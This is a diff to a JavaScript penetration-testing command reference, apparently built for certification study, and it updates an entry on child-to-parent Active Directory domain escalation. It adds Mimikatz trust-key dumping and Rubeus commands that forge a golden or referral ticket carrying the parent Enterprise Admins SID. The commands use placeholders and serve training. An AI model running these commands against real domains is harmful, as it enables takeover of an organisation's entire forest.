@@ -8498,7 +8498,7 @@ const COMMAND_DATA = {
     },
     {
       "id": "crtp-child-to-parent",
-      "name": "Child-to-Parent Domain Escalation (Extra SIDs / SID History)",
+      "name": "Child-to-Parent Domain Escalation (krbtgt SID-History OR Trust Key)",
       "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /sids:<parent_enterprise_admin_sid> /user:Administrator /ptt",
       "description": "Escalate from child domain to parent forest root by forging a golden ticket with the parent's Enterprise Admins SID (S-1-5-21-<parent>-519) in SID History.",
       "platform": "windows",
@@ -8524,7 +8524,9 @@ const COMMAND_DATA = {
         "enterprise-admin",
         "golden-ticket",
         "sid-history",
-        "extra-sids"
+        "extra-sids",
+        "trust-key",
+        "inter-realm"
       ],
       "steps": [
         {
@@ -8584,7 +8586,7 @@ const COMMAND_DATA = {
           "rel": "next"
         }
       ],
-      "notes": "EA SID = S-1-5-21-<parent_domain>-519. Added to SID History field. PAC validation accepts child-signed tickets via transitive trust.",
+      "notes": "EA SID = S-1-5-21-<parent_domain>-519. Added to SID History field. PAC validation accepts child-signed tickets via transitive trust. | Two lab methods: (LO19) child krbtgt -> golden ticket with parent EA SID in SID History (steps above); (LO18) dump the child<->parent trust key (lsadump::trust /patch) -> forge a referral TGT with /service:krbtgt /target:<parent> -> asktgs for a parent service (variations). Intra-forest trusts do NOT SID-filter by default, so the EA SID is honored.",
       "references": [
         {
           "title": "CRTP - Child to Parent Domain",
@@ -8613,12 +8615,16 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "label": "AES256 key",
-          "command": "Rubeus.exe golden /aes256:<child_krbtgt_aes> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt"
+          "label": "Alt method (LO18): dump inter-realm TRUST KEY",
+          "command": "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'   # note the [In] key for the parent domain"
         },
         {
-          "label": "Impacket ticketer",
-          "command": "ticketer.py -nthash <child_krbtgt_hash> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_ea_sid> Administrator"
+          "label": "Forge referral TGT with the trust key + parent EA SID",
+          "command": "Rubeus.exe golden /rc4:<trust_key> /domain:<child_domain> /sid:<child_sid> /sids:<parent_EA_sid> /user:Administrator /service:krbtgt /target:<parent_domain> /nowrap"
+        },
+        {
+          "label": "Request a parent-domain TGS with the forged ticket",
+          "command": "Rubeus.exe asktgs /ticket:<forged_tgt> /service:cifs/<parent_dc> /dc:<parent_dc> /ptt"
         }
       ]
     },
@@ -90997,7 +91003,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 908,
-  "buildDate": "2026-09-08T22:32:42.036Z",
+  "buildDate": "2026-09-08T22:40:56.995Z",
   "certifications": [
     "CDSA",
     "CPTS",
